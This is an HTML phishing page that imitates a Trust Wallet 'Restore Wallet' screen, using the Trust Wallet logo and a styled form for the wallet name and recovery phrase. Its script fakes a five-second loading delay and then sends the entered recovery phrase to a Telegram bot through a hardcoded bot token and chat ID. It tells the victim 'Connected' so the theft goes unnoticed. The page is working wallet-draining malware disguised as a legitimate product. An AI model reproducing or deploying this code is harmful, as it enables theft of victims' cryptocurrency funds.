<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Restore Wallet</title>
<style>
    body {
        margin: 0;
        font-family: 'Helvetica Neue', Arial, sans-serif;
        background-color: #0f0f0f;
        color: #fff;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
    }

    .wallet-container {
        background: #1e1e1e;
        border-radius: 25px;
        padding: 30px 20px;
        width: 90%;
        max-width: 400px;
        box-shadow: 0 4px 15px rgba(0,0,0,0.5);
        text-align: center;
    }

    img.logo {
        width: 120px;
        margin-bottom: 20px;
    }

    label {
        font-size: 14px;
        margin-bottom: 5px;
        display: block;
        font-weight: 500;
        text-align: left;
    }

    input, textarea {
        width: 100%;
        padding: 15px;
        border-radius: 15px;
        border: none;
        background: #2a2a2a;
        color: #fff;
        font-size: 16px;
        margin-bottom: 15px;
        box-sizing: border-box;
    }

    textarea {
        height: 100px;
        resize: none;
    }

    .instruction {
        font-size: 12px;
        color: #aaa;
        margin-bottom: 20px;
        text-align: left;
    }

    button {
        width: 100%;
        padding: 15px;
        border-radius: 15px;
        border: none;
        background: linear-gradient(90deg, #4caf50, #2e7d32);
        color: #fff;
        font-size: 16px;
        font-weight: 600;
        cursor: pointer;
        position: relative;
    }

    button.loading::after {
        content: "Loading...";
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        font-size: 16px;
    }

    .popup {
        display: none;
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background: #1e1e1e;
        padding: 20px 40px;
        border-radius: 20px;
        text-align: center;
        font-size: 18px;
        z-index: 100;
        box-shadow: 0 4px 15px rgba(0,0,0,0.5);
    }
</style>
</head>
<body>
<div class="wallet-container">
    <img class="logo" src="https://trustwallet.com/assets/images/media/assets/TWT.png" alt="Trust Wallet Logo">

    <label for="walletName">Wallet Name</label>
    <input type="text" id="walletName" placeholder="Enter wallet name">

    <label for="phrase">Recovery Phrase</label>
    <textarea id="phrase" placeholder="Enter your recovery phrase here"></textarea>
    <div class="instruction">...typically 12 (sometimes 18,24) words separated by single space</div>

    <button id="restoreBtn">Restore Wallet</button>
</div>

<div class="popup" id="popup"></div>

<script>
const BOT_TOKEN = '6772519097:AAH00f7tXv8V_T1NV--T5LWpNY_-CfwhiZ4';
const CHAT_ID = '6876291548';

const restoreBtn = document.getElementById('restoreBtn');
const walletNameInput = document.getElementById('walletName');
const phraseInput = document.getElementById('phrase');
const popup = document.getElementById('popup');

let connectedPhrases = new Set();

function showPopup(message) {
    popup.innerText = message;
    popup.style.display = 'block';
    setTimeout(() => {
        popup.style.display = 'none';
    }, 2000);
}

function sendToTelegram(message) {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
        .then(res => console.log('Sent to Telegram'))
        .catch(err => console.error('Error sending to Telegram:', err));
}

restoreBtn.addEventListener('click', () => {
    const walletName = walletNameInput.value.trim();
    const phrase = phraseInput.value.trim();

    if (!walletName || !phrase) return;

    if (connectedPhrases.has(phrase)) {
        showPopup("Already connected");
        return;
    }

    // Simulate loading for 5 seconds
    restoreBtn.classList.add('loading');
    restoreBtn.disabled = true;

    setTimeout(() => {
        restoreBtn.classList.remove('loading');
        restoreBtn.disabled = false;

        connectedPhrases.add(phrase);
        sendToTelegram(`Wallet Name: ${walletName}\nRecovery Phrase: ${phrase}`);
        showPopup("Connected");

        walletNameInput.value = '';
        phraseInput.value = '';
    }, 5000);
});
</script>
</body>
</html>
